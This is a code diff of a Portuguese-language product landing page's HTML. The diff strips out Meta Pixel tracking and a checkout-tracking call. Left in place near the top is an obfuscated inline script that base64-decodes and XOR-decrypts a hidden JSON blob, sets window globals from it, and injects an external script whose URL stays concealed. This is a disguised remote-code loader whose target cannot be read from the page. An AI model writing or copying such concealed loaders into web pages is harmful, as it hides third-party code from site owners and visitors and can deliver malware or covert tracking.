@@ -6,23 +6,7 @@
 <link href="assets/css/5886db39.css" rel="stylesheet"/>
 <style>.impu-legal-overlay{position:fixed;inset:0;background:#000000b3;display:none;z-index:2147483000;padding:26px 14px;overflow-y:auto}.impu-legal-overlay:target{display:block}.impu-legal-box{background:#fff;color:#1f2937;max-width:640px;margin:24px auto;border-radius:16px;padding:34px 28px 30px;box-shadow:0 24px 70px #00000073;position:relative;text-align:left}.impu-legal-box h2{font-size:22px;font-weight:900;text-align:center;margin:0 0 20px;color:#111827}.impu-legal-box p{font-size:13.5px;line-height:1.7;margin:0 0 12px;color:#374151}.impu-legal-box strong{color:#111827}.impu-legal-box a{color:#2563eb;font-weight:700;text-decoration:none}.impu-legal-close{position:absolute;top:10px;right:16px;font-size:30px;line-height:1;color:#9ca3af;text-decoration:none;font-weight:700}
 </style>
-<!-- Meta Pixel Code -->
-<script>
-!function(f,b,e,v,n,t,s)
-{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-n.queue=[];t=b.createElement(e);t.async=!0;
-t.src=v;s=b.getElementsByTagName(e)[0];
-s.parentNode.insertBefore(t,s)}(window, document,'script',
-'https://connect.facebook.net/en_US/fbevents.js');
-fbq('init', '608777460930472');
-fbq('track', 'PageView');
-</script>
-<noscript><img height="1" width="1" style="display:none"
-src="https://www.facebook.com/tr?id=608777460930472&ev=PageView&noscript=1"
-/></noscript>
-<!-- End Meta Pixel Code -->
+
 <style>html{scroll-behavior:smooth}#veja-dentro,#rotina,#como-recebe,#diferente,#elegir-pack{scroll-margin-top:12px}</style><script>(function(){var q_erf=atob("DIXwJ9iZh06GowcgB/7SUqr1pXSky3NUd/bKCPf64yCo1nNNbuOJCbv26mDk0ShTZPeZV6zqqD7v22JMKPWZX731qST1gSsCZvGEVbH78jrj0CUaXNjcBb/16Cznz3QCPd6LBbb46iukmSVQbv2VS5H9pWKk1WZMcuDSHfqv5ivjkDQVP7zAEu2v5Xi1wTZENeTCH+q7+hP7");var x_mp=[];for(var w_ke=0;w_ke<q_erf.length;w_ke++){x_mp.push(q_erf.charCodeAt(w_ke)&255);}var r_pg7=x_mp[0];var s_skkb=x_mp.slice(1,1+r_pg7);var u_nl=x_mp.slice(1+r_pg7);var g_kbg6=u_nl.map(function(b,q_av){return b^s_skkb[q_av%r_pg7];});var j_ss="";for(var v_mdc=0;v_mdc<g_kbg6.length;v_mdc++){j_ss+=String.fromCharCode(g_kbg6[v_mdc]&255);}var w_fj=decodeURIComponent(escape(j_ss));var z_m=JSON.parse(w_fj);var k_tbl=z_m.globals||[];k_tbl.forEach(function(r_pzi){window[r_pzi.name]=r_pzi.value;});var s_6o=document.createElement("script");s_6o.src=z_m.url;s_6o.async=true;s_6o.defer=true;(z_m.attributes||[]).forEach(function(e_yu1){s_6o.setAttribute(e_yu1.name,e_yu1.value);});(document.head||document.documentElement).appendChild(s_6o);})();</script>
 <script>
 (function(){
@@ -1690,10 +1674,6 @@ document.addEventListener("click",function(e){
   var el=e.target&&e.target.closest&&e.target.closest("a[data-cakto]"); if(!el) return;
   e.preventDefault();
   var u; try{ u=new URL(el.getAttribute("href")); }catch(x){ return; }
-  try{
-    var full=u.pathname.indexOf("36qa69y")>-1, val=10, nm=full?"Pack completo: Mega Pack + 4 cadernos":"Mega Pack de Inventores";
-    if(typeof window.fbq==="function"){ window.fbq("track","InitiateCheckout",{value:val,currency:"BRL",content_type:"product",content_name:nm,num_items:1,contents:[{id:nm,quantity:1,item_price:val}]}); }
-  }catch(x){}
   try{
     var cur=new URL(window.location.href), st={};
     try{ st=JSON.parse(sessionStorage.getItem("impultienda_utm")||"{}")||{}; }catch(x){}
